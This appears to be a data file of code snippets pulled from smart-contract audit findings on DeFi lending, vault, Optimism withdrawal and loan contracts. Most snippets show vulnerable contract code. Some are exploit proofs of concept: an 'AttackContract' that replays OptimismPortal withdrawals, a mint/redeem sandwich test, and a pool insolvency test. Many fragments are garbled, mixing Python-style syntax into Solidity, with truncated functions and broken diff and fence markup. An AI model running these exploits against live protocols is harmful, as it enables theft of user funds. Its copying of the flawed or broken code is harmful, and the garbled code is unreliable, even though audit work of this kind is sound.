"```\nuint256 oldShare = pos.debtShareOf[debtToken];\n\n(uint256 amountPaid, uint256 share) = repayInternal(\n    positionId,\n    debtToken,\n    amountCall\n);\n\nuint256 liqSize = (pos.collateralSize * share) / oldShare;\nuint256 uTokenSize = (pos.underlyingAmount * share) / oldShare;\nuint256 uVaultShare = (pos.underlyingVaultShare * share) / oldShare;\n\npos.collateralSize -= liqSize;\npos.underlyingAmount -= uTokenSize;\npos.underlyingVaultShare -= uVaultShare;\n```\n```\nuint256 liqSize = (pos.collateralSize * share) / oldShare;\nuint256 uTokenSize = (pos.underlyingAmount * share) / oldShare;\nuint256 uVaultShare = (pos.underlyingVaultShare * share) / oldShare;\n```"
"```\ndiff --git a/test/spell/ichivault.spell.test.ts b/test/spell/ichivault.spell.test.ts\nindex 258d653..551a6eb 100644\n--- a/test/spell/ichivault.spell.test.ts\nb/test/spell/ichivault.spell.test.ts\n@@ -163,6 @@ describe('ICHI Angel Vaults Spell', () => {\n    afterTreasuryBalance.sub(beforeTreasuryBalance)\n       .to.be.equal(depositAmount.mul(50).div(10000))\n})\n\nit(""should revert when exceeds max pos size due to increasing position"", async () => {\n    await ichi.approve(bank.address, ethers.constants.MaxUint256);\n    await bank.execute(\n        0,\n        spell.address,\n        iface.encodeFunctionData(""openPosition"", [\n            0, ICHI, USDC, depositAmount.mul(4), borrowAmount.mul(6) // Borrow 1.800e6 USDC\n        ])\n    );\n    await expect(\n        bank.execute(\n            0,\n            spell.address,\n            iface.encodeFunctionData(""openPosition"", [\n                0, ICHI, USDC, depositAmount.mul(1), borrowAmount.mul(2) // Borrow 300e6 USDC\n            ])\n        )\n    ).to.be.revertedWith(""EXCEED_MAX_POS_SIZE""); // 1_800e6 // 300e6 = 2_100e6 > 2_000e6 strategy max position size limit\n})\n\nit(""should be able to return position risk ratio"", async () => {\n    let risk = await bank.getPositionRisk(1);\n    console.log('Prev Position Risk', utils.formatUnits(risk, 2), '%');\n```\n```\nyarn hardhat test --grep ""should revert when exceeds max pos size due to increasing position""\n```"
"```\nfunction getPrice(address token) external view override returns (uint256) {\n    IICHIVault vault = IICHIVault(token);\n    uint256 totalSupply = vault.totalSupply();\n    if (totalSupply == 0) {\n        return 0;\n    }\n\n    address token0 = vault.token0();\n    address token1 = vault.token1();\n\n    (uint256 r0, uint256 r1) = vault.getTotalAmounts();\n    uint256 px0 = base.getPrice(address(token0));\n    uint256 px1 = base.getPrice(address(token1));\n    uint256 t0Decimal = IERC20Metadata(token0).decimals();\n    uint256 t1Decimal = IERC20Metadata(token1).decimals();\n\n    uint256 totalReserve = (r0 * px0) / (10**t0Decimal) + (r1 * px1) / (10**t1Decimal);\n\n    return (totalReserve * 1e18) / totalSupply;\n}\n```"
```\nmodifier onlyEOAEx() {\n    if (!allowContractCalls &&!whitelistedContracts[msg.sender]) {\n        if (msg.sender!= tx.origin) {\n            revert NOT_EOA(msg.sender);\n        }\n    }\n}\n```
"```\npragma solidity 0.8.18;\n\nimport ""forge-std/Test.sol"";\nimport ""../../lib/utils/VyperDeployer.sol"";\n\nimport ""../IVault.sol"";\nimport ""../IAlchemistV2.sol"";\nimport ""../MintableERC721.sol"";\nimport ""openzeppelin/token/ERC20/IERC20.sol"";\n\ncontract VaultTest is Test {\n    VyperDeployer vyperDeployer = new VyperDeployer();\n\n    FairFundingToken nft;\n    IVault vault;\n    address vaultAdd;\n    IAlchemistV2 alchemist = IAlchemistV2(0x062Bf725dC4cDF947aa79Ca2aaCCD4F385b13b5c);\n    IWhitelist whitelist = IWhitelist(0xA3dfCcbad1333DC69997Da28C961FF8B2879e653);\n    address yieldToken = 0xa258C4606Ca8206D8aA700cE2143D7db854D168c;\n    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    address admin = 0x2fEb1512183545f48f6b9C5b4EbfCaF49CfCa6F3;\n    address user1 = address(0x123);\n    address user2 = address(0x456);\n\n    function setUp() public {\n        vm.startPrank(admin);\n        nft = new FairFundingToken();\n        vault = IVault(vyperDeployer.deployContract(""Vault"", abi.encode(address(nft), admin));\n        vaultAdd = address(vault);\n        vault.set_alchemist(address(alchemist));\n\n        vm.stopPrank();\n        vm.startPrank(0x9e2b6378ee8ad2A4A95Fe481d63CAba8FB0EBBF9);\n        whitelist.add(vaultAdd);\n        whitelist.add(admin);\n        whitelist.add(user1);\n        whitelist.add(user2);\n        vm.stopPrank();\n\n        vm.startPrank(admin);\n\n        vault.add_depositor(admin);\n        vault.add_depositor(user1);\n        vault.add_depositor(user2);\n\n        assert(alchemist.isSupportedYieldToken(yieldToken));\n\n        nft.mint(admin, 1);\n        nft.mint(user1, 2);\n        n"
"```\nfunction setTierWinner(\n    string calldata _bountyId,\n    uint256 _tier,\n    string calldata _winner\n) external {\n    IBounty bounty = getBounty(_bountyId);\n    require(msg.sender == bounty.issuer(), Errors.CALLER_NOT_ISSUER);\n    bounty.setTierWinner(_winner, _tier);\n\n    emit TierWinnerSelected(\n        address(bounty),\n        bounty.getTierWinners(),\n        new bytes(0),\n        VERSION_1\n    );\n}\n\nfunction setTierWinner(string memory _winner, uint256 _tier)\n    external\n    onlyOpenQ\n{\n    tierWinners[_tier] = _winner;\n}\n```"
"```\nfunction setPayoutScheduleFixed(\n    uint256[] calldata _payoutSchedule,\n    address _payoutTokenAddress\n) external onlyOpenQ {\n    require(\n        bountyType == OpenQDefinitions.TIERED_FIXED,\n        Errors.NOT_A_FIXED_TIERED_BOUNTY\n    );\n    payoutSchedule = _payoutSchedule;\n    payoutTokenAddress = _payoutTokenAddress;\n\n    string[] memory newTierWinners = new string[](payoutSchedule.length);\n    bool[] memory newInvoiceComplete = new bool[](payoutSchedule.length);\n    bool[] memory newSupportingDocumentsCompleted = new bool[](payoutSchedule.length);\n\n    for (uint256 i = 0; i < tierWinners.length; i++) {\n        newTierWinners[i] = tierWinners[i];\n    }\n    tierWinners = newTierWinners;\n\n    for (uint256 i = 0; i < invoiceComplete.length; i++) {\n        newInvoiceComplete[i] = invoiceComplete[i];\n    }\n    invoiceComplete = newInvoiceComplete;\n\n    for (uint256 i = 0; i < supportingDocumentsComplete.length; i++) {\n        newSupportingDocumentsCompleted[i] = supportingDocumentsComplete[i];\n    }\n    supportingDocumentsComplete = newSupportingDocumentsCompleted;\n}\n```"
"```\nfunction increaseTotalSupply(uint256 _amount) private {\n    daiMock.mint(address(this), _amount);\n    daiMock.approve(address(uToken), _amount);\n    uToken.mint(_amount);\n}\n\nfunction testMintRedeemSandwich() public {\n    increaseTotalSupply(50 ether);\n\n    vm.prank(ALICE);\n    uToken.borrow(ALICE, 50 ether);\n    uint256 borrowed = uToken.borrowBalanceView(ALICE);\n\n    vm.roll(block.number + 500);\n\n    vm.startPrank(BOB);\n    daiMock.approve(address(uToken), 100 ether);\n    uToken.mint(100 ether);\n\n    console.log("" [UToken] Total supply:"", uToken.totalSupply());\n    console.log("" [UToken] BOB balance:"", uToken.balanceOf(BOB));\n    console.log("" [DAI]    BOB balance:"", daiMock.balanceOf(BOB));\n\n    uint256 currExchangeRate = uToken.exchangeRateStored();\n    console.log("" [1] Exchange rate:"", currExchangeRate);\n    vm.stopPrank();\n\n    vm.startPrank(ALICE);\n    uint256 interest = uToken.calculatingInterest(ALICE);\n    uint256 repayAmount = borrowed + interest;\n\n    daiMock.approve(address(uToken), repayAmount);\n    uToken.repayBorrow(ALICE, repayAmount);\n\n    console.log("" [UToken] Total supply:"", uToken.totalSupply());\n    console.log("" [UToken] ALICE balance:"", uToken.balanceOf(ALICE));\n    console.log("" [DAI]    ALICE balance:"", daiMock.balanceOf(ALICE));\n\n    currExchangeRate = uToken.exchangeRateStored();\n    console.log("" [2] Exchange rate:"", currExchangeRate);\n    vm.stopPrank();\n\n    vm.startPrank(BOB);\n    uToken.redeem(uToken.balanceOf(BOB), 0);\n\n    console.log("" [UToken] Total supply:"", uToken.totalSupply());\n    console.log("" [UToken] BOB balance:"", uToken.balanceOf(BOB));\n    console.log("" [DAI]    BOB balance:"", daiMock.balanceOf(BOB));\n\n    currExchangeRate = uToken.exchangeRateStored();\n    console.log("" [3] Exchange rate:"", currExchangeRate);\n}\n```\n```\n[PASS] testMintRedeemSandwich() (gas: 560119)\nLogs:\n\n  [UToken] Total supply: 150000000000000000000\n  [UToken] BOB balance: 100000000000000000000\n  [DAI]    BOB balance: 0\n  [1] Exchange rate: 1000000000000000000\n\n  [UToken] Total supply: 150000000000000000000\n  [UToken] ALICE balance: 0\n  [DAI]    ALICE balance: 99474750000000000000\n  [2] Exchange rate: 1000084166666666666\n\n  [UToken] Total supply: 50000000000000000000\n  [UToken] BOB balance: 0\n  [DAI]    BOB balance: 100008416666666666600\n  [3] Exchange rate: 1000084166666666668\n```"
"```\ncontracts/user/UserManager.sol\n\nfunction unstake(uint96 amount) external whenNotPaused nonReentrant {\n    Staker storage staker = stakers[msg.sender];\n\n    if (staker.stakedAmount - staker.locked < amount) {\n        revert InsufficientBalance();\n    }\n\n    comptroller.withdrawRewards(msg.sender, stakingToken);\n\n    uint256 remaining = IAssetManager(assetManager).withdraw(stakingToken, msg.sender, amount);\n\n    if (uint96(remaining) > amount) {\n        revert AssetManagerWithdrawFailed();\n    }\n\n    uint96 actualAmount = amount - uint96(remaining);\n\n    _updateStakedCoinAge(msg.sender, staker);\n\n    staker.stakedAmount -= actualAmount;\n    totalStaked -= actualAmount;\n\n    emit LogUnstake(msg.sender, actualAmount);\n}\n```\n```\ncontracts/user/UserManager.sol\n\nfunction _updateStakedCoinAge(address stakerAddress, Staker storage staker) private {\n    uint64 currentBlock = uint64(block.number);\n    uint256 lastWithdrawRewards = getLastWithdrawRewards[stakerAddress];\n    uint256 blocksPast = (uint256(currentBlock) - _max(lastWithdrawRewards, uint256(staker.lastUpdated)));\n    staker.stakedCoinAge += blocksPast * uint256(staker.stakedAmount);\n    staker.lastUpdated = currentBlock;\n}\n```\n```\ncontracts/token/Comptroller.sol\n\nfunction withdrawRewards(address account, address token) external override whenNotPaused returns (uint256) {\n    IUserManager userManager = _getUserManager(token);\n\n    (UserManagerAccountState memory user, Info memory userInfo, uint256 pastBlocks) = _getUserInfo(\n        userManager,\n        account,\n        token,\n        0\n    );\n\n    uint256 globalTotalStaked = userManager.globalTotalStaked();\n    uint256 amount = _calculateRewardsByBlocks(\n        account,\n        token,\n        pastBlocks,\n        userInfo,\n        globalTotalStaked,\n        user\n    );\n\n    gInflationIndex = _getInflationIndexNew(\n        globalTotalStaked,\n        block.number - gLastUpdatedBlock\n    );\n    gLastUpdatedBlock = block.number;\n    users[account][token].updatedBlock = block.number;\n    users[account][token].inflationIndex = gInflationIndex;\n\n    if (unionToken.balanceOf(address(this)) >= amount && amount > 0) {\n        unionToken.safeTransfer(account, amount);\n        users[account][token].accrued = 0;\n        emit LogWithdrawRewards(account, amount);\n        return amount;\n    } else {\n        users[account][token].accrued = amount;\n        emit LogWithdrawRewards(account, 0);\n        return 0;\n    }\n}\n```\n```\n(UserManagerAccountState memory user,\n    Info memory userInfo,\n    uint256 pastBlocks) = _getUserInfo(\n    userManager,\n    account,\n    token,\n    0\n);\n```\nuint256 amount = _calculateRewardsByBlocks(\n    account,\n    token,\n    pastBlocks,\n    userInfo,\n    globalTotalStaked,\n    user\n);\n```\nif (user.effectiveStaked == 0 \n    || totalStaked == 0 \n    || startInflationIndex == 0 \n    || pastBlocks == 0):\n    return 0\n```\n```\nif (unionToken.balanceOf(address(this)) >= amount && amount > 0) {\n    unionToken.safeTransfer(account, amount);\n    users[account][token].accrued = 0;\n    emit LogWithdrawRewards(account, amount);\n    return amount;\n} else {\n    users[account][token].accrued = amount;\n    emit LogWithdrawRewards(account, 0);\n    return 0;\n}\n```"
```\nif (amountIn > 0) {\n    uTokenAmount = amountIn;\n    underlyingAmount = (amountIn * exchangeRate) / WAD;\n} else {\n    uTokenAmount = (amountOut * WAD) / exchangeRate;\n    underlyingAmount = amountOut;\n}\n```
"```\nrequire(\n    gasleft() >= _tx.gasLimit + FINALIZE_GAS_BUFFER,\n    ""OptimismPortal: insufficient gas to finalize withdrawal""\n);"
"```\npragma solidity 0.8.0;\n\nstruct WithdrawalTransaction {\n    uint256 nonce;\n    address sender;\n    address target;\n    uint256 value;\n    uint256 gasLimit;\n    bytes data;\n}\n\ninterface IOptimismPortal {\n    function finalizeWithdrawalTransaction(WithdrawalTransaction memory _tx) external;\n}\n\ncontract AttackContract {\n    bool public donotRevert;\n    bytes metaData;\n    address public optimismPortalAddress;\n\n    constructor(address _optimismPortal) {\n        optimismPortalAddress = _optimismPortal;\n    }\n\n    function enableRevert() public {\n        donotRevert = true;\n    }\n\n    function setMetaData(WithdrawalTransaction memory _tx) public {\n        metaData = abi.encodeWithSelector(\n            IOptimismPortal.finalizeWithdrawalTransaction.selector,\n            _tx\n        );\n    }\n\n    function attack() public {\n        if (!donotRevert) {\n            revert();\n        } else {\n            optimismPortalAddress.call(metaData);\n        }\n    }\n}\n```\n```\nif (!donotRevert):\n    revert()\n```\n```\nfunction enableRevert() public {\n    donotRevert = true;\n}\n```\n```\nfunction setMetaData(WithdrawalTransaction memory _tx) public {\n    metaData = abi.encodeWithSelector(\n        IOptimismPortal.finalizeWithdrawalTransaction.selector,\n        _tx\n    );\n}\n```\n```\nelse:\n    optimismPortalAddress.call(metaData)\n```"
"```\nparams.prevBoughtGas += _amount;\nrequire(\n    int256(uint256(params.prevBoughtGas)) <= MAX_RESOURCE_LIMIT,\n    ""ResourceMetering: cannot buy more gas than available gas limit""\n);\n```\nuint256 resourceCost = _amount * params.prevBaseFee;\nuint256 gasCost = resourceCost / Math.max(block.basefee, 1000000000);\n```"
"```\nfunc MigrateWithdrawal(withdrawal *LegacyWithdrawal, l1CrossDomainMessenger *common.Address) (*Withdrawal, error) {\n    value, err := withdrawal.Value()\n    if err!= nil {\n        return nil, fmt.Errorf(""cannot migrate withdrawal: %w"", err)\n    }\n\n    abi, err := bindings.L1CrossDomainMessengerMetaData.GetAbi()\n    if err!= nil {\n        return nil, err\n    }\n\n    versionedNonce := EncodeVersionedNonce(withdrawal.Nonce, new(big.Int))\n\n    data, err := abi.Pack(\n        ""relayMessage"",\n        versionedNonce,\n        withdrawal.Sender,\n        withdrawal.Target,\n        value,\n        new(big.Int),\n        withdrawal.Data,\n    )\n    if err!= nil {\n        return nil, fmt.Errorf(""cannot abi encode relayMessage: %w"", err)\n    }\n\n    gasLimit := uint64(len(data)*16 + 200_000)\n\n    w := NewWithdrawal(\n        versionedNonce,\n        &predeploys.L2CrossDomainMessengerAddr,\n        l1CrossDomainMessenger,\n        value,\n        new(big.Int).SetUint64(gasLimit),\n        data,\n    )\n    return w, nil\n}"
"```\nif addr == dump.MessagePasserAddress:\n    statedumper.WriteMessage(caller.Address(), input)\n```\n```\nselector := crypto.Keccak256([]byte(""relayMessage(address,address,bytes,uint256)""))[0:4]\nif!bytes.Equal(data[0:4], selector) {\n    return fmt.Errorf(""invalid selector: 0x%x"", data[0:4])\n}\n\nmsgSender := data[len(data) - len(predeploys.L2CrossDomainMessengerAddr):]\nif!bytes.Equal(msgSender, predeploys.L2CrossDomainMessengerAddr.Bytes()) {\n    return errors.New(""invalid msg.sender"")\n}\n```\n```\nfunction passMessageToL1(bytes memory _message) external {\n    sentMessages[keccak256(abi.encodePacked(_message, msg.sender))] = true;\n}\n```\n```\nfor slot := range slotsAct {\n    _, ok := slotsInp[slot]\n    if!ok {\n        return nil, fmt.Errorf(""unknown storage slot in state: %s"", slot)\n    }\n}"
"```\nrequire(\n    gasleft() >= _tx.gasLimit + FINALIZE_GAS_BUFFER,\n    ""OptimismPortal: insufficient gas to finalize withdrawal""\n);"
"```\nl2Outputs.push(\n    Types.OutputProposal({\n        outputRoot: _outputRoot,\n        timestamp: uint128(block.timestamp),\n        l2BlockNumber: uint128(_l2BlockNumber)\n    })\n);\n```\nfunction deleteL2Outputs(uint256 _l2OutputIndex) external {\n    require(\n        msg.sender == CHALLENGER,\n        ""L2OutputOracle: only the challenger address can delete outputs""\n    );\n\n    require(\n        _l2OutputIndex < l2Outputs.length,\n        ""L2OutputOracle: cannot delete outputs after the latest output index""\n    );\n\n    uint256 prevNextL2OutputIndex = nextOutputIndex();\n\n    assembly {\n        sstore(l2Outputs.slot, _l2OutputIndex)\n    }\n\n    emit OutputsDeleted(prevNextL2OutputIndex, _l2OutputIndex);\n}\n```"
"```\nfunction _revertOnMinDebt(\n    LoansState storage loans_,\n    uint256 poolDebt_,\n    uint256 borrowerDebt_,\n    uint256 quoteDust_\n) view {\n    if (borrowerDebt_!= 0) {\n        uint256 loansCount = Loans.noOfLoans(loans_);\n        if (loansCount >= 10) {\n            if (borrowerDebt_ < _minDebtAmount(poolDebt_, loansCount)) {\n                revert AmountLTMinDebt();\n            }\n        } else {\n            if (borrowerDebt_ < quoteDust_) {\n                revert DustAmountNotExceeded();\n            }\n        }\n    }\n}\n```\nfunction _minDebtAmount(\n    uint256 debt_,\n    uint256 loansCount_\n) public returns (uint256 minDebtAmount_) {\n    if (loansCount_!= 0) {\n        minDebtAmount_ = Maths.wdiv(Maths.wdiv(debt_, Maths.wad(loansCount_)), 10**19);\n    }\n}\n```"
"```\nNFTTypes nftType;\n\nif (collateral_ == 0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB) {\n    nftType = NFTTypes.CRYPTOPUNKS;\n} else if (collateral_ == 0x06012c8cf97BEaD5deAe237070F9587f8E7A266d || collateral_ == 0x87d598064c736dd0C712D329aFCFAA0Ccc1921A1) {\n    nftType = NFTTypes.CRYPTOKITTIES;\n} else {\n    try {\n        IERC165(collateral_).supportsInterface(0x80ac58cd).returns(bool supportsERC721Interface);\n        if (!supportsERC721Interface) {\n            revert NFTNotSupported();\n        }\n    } catch {\n        revert NFTNotSupported();\n    }\n    nftType = NFTTypes.STANDARD_ERC721;\n}\n```\n```\n/**\n * Helper function for transferring multiple NFT tokens from msg.sender to pool.\n * Reverts in case token id is not supported by subset pool.\n * \n * @param poolTokens_ Array in pool that tracks NFT ids (could be tracking NFTs pledged by borrower or NFTs added by a lender in a specific bucket).\n * @param tokenIds_   Array of NFT token ids to transfer from msg.sender to pool.\n */\n\nfunction _transferFromSenderToPool(\n    uint256[] storage poolTokens_,\n    uint256[] calldata tokenIds_\n) internal {\n    bool subset = _getArgUint256(SUBSET)!= 0;\n    uint8 nftType = _getArgUint8(NFT_TYPE);\n\n    for (uint256 i = 0; i < tokenIds_.length; i++) {\n        uint256 tokenId = tokenIds_[i];\n        if (subset &&!tokenIdsAllowed[tokenId]) {\n            revert OnlySubset();\n        }\n        poolTokens_.push(tokenId);\n\n        if (nftType == uint8(NFTTypes.STANDARD_ERC721)) {\n            _transferNFT(msg.sender, address(this), tokenId);\n        } else if (nftType == uint8(NFTTypes.CRYPTOKITTIES)) {\n            ICryptoKitties(_getArgAddress(COLLATERAL_ADDRESS)).transferFrom(msg.sender, address(this), tokenId);\n        } else {\n            ICryptoPunks(_getArgAddress(COLLATERAL_ADDRESS)).buyPunk(tokenId);\n        }\n\n        unchecked {\n            ++i;\n        }\n    }\n}\n```\n```\nuint8 nftType = _getArgUint8(NFT_TYPE);\n\nfor (uint256 i = 0; i < amountToRemove_;) {\n    uint256 tokenId = poolTokens_[--noOfNFTsInPool]; // start with transferring the last token added in bucket\n    poolTokens_.pop();\n\n    if (nftType == uint8(NFTTypes.STANDARD_ERC721)) {\n        _transferNFT(address(this), toAddress_, tokenId);\n    } else if (nftType == uint8(NFTTypes.CRYPTOKITTIES)) {\n        ICryptoKitties(_getArgAddress(COLLATERAL_ADDRESS)).transfer(toAddress_, tokenId);\n    } else {\n        ICryptoPunks(_getArgAddress(COLLATERAL_ADDRESS)).transferPunk(toAddress_, tokenId);\n    }\n\n    tokensTransferred[i] = tokenId;\n\n    unchecked {\n        ++i;\n    }\n}\n```\n```\nif (nftType == uint8(NFTTypes.CRYPTOKITTIES)) {\n    ICryptoKitties(_getArgAddress(COLLATERAL_ADDRESS)).transferFrom(\n        msg.sender,\n        address(this),\n        tokenId\n    );\n}\n```\n```\nelse if (nftType == uint8(NFTTypes.CRYPTOKITTIES)) {\n    ICryptoKitties(_getArgAddress(COLLATERAL_ADDRESS)).transfer(toAddress_, tokenId);\n}\n```\n```\nfunction transferFrom(\n    address _from,\n    address _to,\n    uint256 _tokenId\n) public whenNotPaused {\n```\n```\nfunction transferFrom(\n    address _from,\n    address _to,\n    uint256 _tokenId\n) \nexternal \nwhenNotPaused {\n```"
"```\nif (removeParams.bucketCollateral == 0\n    && unscaledRemaining == 0\n    && lpsRemaining!= 0):\n    emit BucketBankruptcy(params_.index, lpsRemaining);\n    bucket.lps = 0;\n    bucket.bankruptcyTime = block.timestamp;\nelse:\n    bucket.lps = lpsRemaining;\n```"
"```\nfunction _addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint amountADesired,\n    uint amountBDesired,\n    uint amountAMin,\n    uint amountBMin\n) internal virtual returns (uint amountA, uint amountB) {\n    // Create the pair if it doesn't exist yet\n    if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) {\n        IUniswapV2Factory(factory).createPair(tokenA, tokenB);\n    }\n    (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB);\n    if (reserveA == 0 && reserveB == 0) {\n        (amountA, amountB) = (amountADesired, amountBDesired);\n    } else {\n        uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);\n        if (amountBOptimal <= amountBDesired) {\n            require(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n            (amountA, amountB) = (amountADesired, amountBOptimal);\n        } else {\n            uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);\n            assert(amountAOptimal <= amountADesired);\n            require(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n            (amountA, amountB) = (amountAOptimal, amountBDesired);\n        }\n    }\n}\n\nfunction addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint amountADesired,\n    uint amountBDesired,\n    uint amountAMin,\n    uint amountBMin,\n    address to,\n    uint deadline\n) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) {\n    (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);\n    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n    TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);\n    TransferHelper.safeTransferFrom(token\n```\ndef modifier(ensure):\n    require(deadline >= block.timestamp, 'UniswapV2Router: EXPIRED')\n    _;\n```\n```\nrequire(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n```\n```\nrequire(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n```"
"```\nNP_t = (1 + rate_s) * MOMP_s * TP_s * (TP_s / LUP_s) * (BI_s / BI_t)\n```\n```\nuint256 momp = _priceAt(\n    Deposits.findIndexOfSum(\n        deposits_,\n        Maths.wdiv(poolState_.debt, noOfLoans * 1e18)\n    )\n);\n```"
"```\nfunction testInsolvency() public {\n    uint256 interestRateOne = 0.05 * 10**18; // Collateral  // Quote (loaned token, short position)\n    address poolThreeAddr = erc20PoolFactory.deployPool(address(dai), address(weth), interestRateOne);\n    ERC20Pool poolThree = ERC20Pool(address(poolThreeAddr));\n    vm.label(poolThreeAddr, ""DAI / WETH Pool Three"");\n\n    // Setup scenario and send liquidity providers some tokens\n    vm.startPrank(address(daiDoner));\n    dai.transfer(address(charlie), 3200 ether);\n    vm.stopPrank();\n\n    vm.startPrank(address(wethDoner));\n    weth.transfer(address(bob), 1000 ether);\n    vm.stopPrank();\n\n    // Start Scenario\n    uint256 fenwick = 5635;\n\n    vm.startPrank(address(alice));\n    weth.deposit{value: 2 ether}();\n    weth.approve(address(poolThree), 2.226 ether);\n    poolThree.addQuoteToken(2 ether, fenwick);\n    vm.stopPrank();\n\n    vm.startPrank(address(bob));\n    weth.deposit{value: 9 ether}();\n    weth.approve(address(poolThree), 9 ether);\n    poolThree.addQuoteToken(9 ether, fenwick);\n    vm.stopPrank();\n\n    assertEq(weth.balanceOf(address(poolThree)), 11 ether);\n\n    // ======================== start testing ========================\n    vm.startPrank(address(bob));\n    bytes32 poolSubsetHashes = keccak256(""ERC20_NON_SUBSET_HASH"");\n    IPositionManagerOwnerActions.MintParams memory mp = IPositionManagerOwnerActions.MintParams({\n        recipient: address(bob),\n        pool: address(poolThree),\n        poolSubsetHash: poolSubsetHashes\n    });\n    positionManager.mint(mp);\n    positionManager.setApprovalForAll(address(rewardsManager), true);\n    rewardsManager.stake(1);\n    vm.stopPrank();\n\n    assertEq(dai.balanceOf(address(charlie)), 3200 ether);\n    vm.startPrank(address(charlie)); // Charlie runs away with the weth tokens\n    dai.approve(address(poolThree), 3200 ether);\n    poolThree.drawDebt(address(charlie), 2 ether, fenwick, 3200 ether);\n    vm.stopPrank();\n\n    vm.warp(block.timestamp + 62 days);\n\n    vm.start"
"```\nuint256 loansInPool = loans_.loans.length - 1 + auctions_.noOfAuctions;\nuint256 curMomp = _priceAt(\n    Deposits.findIndexOfSum(\n        deposits_,\n        Maths.wdiv(borrowerAccruedDebt_, loansInPool * 1e18)\n    )\n);\n```"
"```\nfunction repay(uint256 loanID, uint256 repaid) external {\n    Loan storage loan = loans[loanID];\n\n    debt.transferFrom(msg.sender, loan.lender, repaid);\n    collateral.transfer(owner, decollateralized);\n}\n```"
"```\nfunction roll(uint256 loanID) external {\n    Loan storage loan = loans[loanID];\n    Request memory req = loan.request;\n\n    if (block.timestamp > loan.expiry) {\n        revert Default();\n    }\n\n    if (!loan.rollable) {\n        revert NotRollable();\n    }\n\n    uint256 newCollateral = collateralFor(loan.amount, req.loanToCollateral) - loan.collateral;\n    uint256 newDebt = interestFor(loan.amount, req.interest, req.duration);\n\n    loan.amount += newDebt;\n    loan.expiry += req.duration;\n    loan.collateral += newCollateral;\n\n    collateral.transferFrom(msg.sender, address(this), newCollateral);\n}\n```"
"```\nloans.push(\n    Loan(\n        req,\n        req.amount + interest,\n        collat,\n        expiration,\n        true,\n        msg.sender\n    )\n)\n```\nfunction roll(uint256 loanID) external {\n    Loan storage loan = loans[loanID];\n    Request memory req = loan.request;\n\n    if (block.timestamp > loan.expiry) {\n        revert Default();\n    }\n\n    if (!loan.rollable) {\n        revert NotRollable();\n    }\n```\n```\nfunction toggleRoll(uint256 loanID) external returns (bool) {\n    loan.rollable =!loan.rollable;\n}\n```"
"```\nfunction clear(uint256 reqID) external returns (uint256 loanID) {\n    Request storage req = requests[reqID];\n\n    factory.newEvent(reqID, CoolerFactory.Events.Clear);\n\n    if (!req.active) {\n        revert Deactivated();\n    } else {\n        req.active = false;\n\n        uint256 interest = interestFor(req.amount, req.interest, req.duration);\n        uint256 collat = collateralFor(req.amount, req.loanToCollateral);\n        uint256 expiration = block.timestamp + req.duration;\n\n        loanID = loans.length;\n        loans.push(\n            Loan(req, req.amount + interest, collat, expiration, true, msg.sender)\n        );\n        debt.transferFrom(msg.sender, owner, req.amount);\n    }\n}"
"```\nfunction repay(uint256 loanID, uint256 repaid) external {\n    Loan storage loan = loans[loanID];\n\n    if (block.timestamp > loan.expiry) {\n        revert Default();\n    }\n\n    uint256 decollateralized = loan.collateral * repaid / loan.amount;\n\n    if (repaid == loan.amount) {\n        delete loans[loanID];\n    } else {\n        loan.amount -= repaid;\n        loan.collateral -= decollateralized;\n    }\n\n    debt.transferFrom(msg.sender, loan.lender, repaid);\n    collateral.transfer(owner, decollateralized);\n}\n```"
"```\nfunction getEthPrice() internal view returns (uint) {\n    (, int answer,, uint updatedAt,) = ethUsdPriceFeed.latestRoundData();\n\n    if (block.timestamp - updatedAt >= 86400)\n        revert Errors.StalePrice(address(0), address(ethUsdPriceFeed));\n\n    if (answer <= 0)\n        revert Errors.NegativePrice(address(0), address(ethUsdPriceFeed));\n\n    return uint(answer);\n}"
"```\nfunction canCallClaimFees()\n    internal\n    view\n    returns (bool, address[] memory, address[] memory)\n{\n    return (true, WETH, new address[](0));\n}\n```"
"```\nfunction rebalance(\n    uint256 amount,\n    uint256 amountOutMinimum,\n    uint160 sqrtPriceLimitX96,\n    uint24 swapPoolFee,\n    int8 polarity,\n    address account\n) external nonReentrant returns (uint256, uint256) {\n    if (polarity == -1) {\n        return (\n            _rebalanceNegativePnlWithSwap(\n                amount,\n                amountOutMinimum,\n                sqrtPriceLimitX96,\n                swapPoolFee,\n                account\n            )\n        );\n    } else if (polarity == 1) {\n        revert PositivePnlRebalanceDisabled(msg.sender);\n    } else {\n        revert InvalidRebalance(polarity);\n    }\n}\n```\n```\nfunction _rebalanceNegativePnlWithSwap(\n    uint256 amount,\n    uint256 amountOutMinimum,\n    uint160 sqrtPriceLimitX96,\n    uint24 swapPoolFee,\n    address account\n) private returns (uint256, uint256) {\n    SwapParams memory params = SwapParams({\n        tokenIn: assetToken,\n        tokenOut: quoteToken,\n        amountIn: amount,\n        amountOutMinimum: amountOutMinimum,\n        sqrtPriceLimitX96: sqrtPriceLimitX96,\n        poolFee: swapPoolFee\n    });\n    uint256 quoteAmountOut = spotSwapper.swapExactInput(params);\n    int256 shortFall = int256(\n        quoteAmount.fromDecimalToDecimal(18, ERC20(quoteToken).decimals())\n    ) - int256(quoteAmountOut);\n    if (shortFall > 0) {\n        IERC20(quoteToken).transferFrom(\n            account,\n            address(this),\n            uint256(shortFall)\n        );\n    } else if (shortFall < 0) {\n    }\n    vault.deposit(quoteToken, quoteAmount);\n\n    emit Rebalanced(amount, quoteAmount, shortFall);\n    return (amount, quoteAmount);\n}\n```"
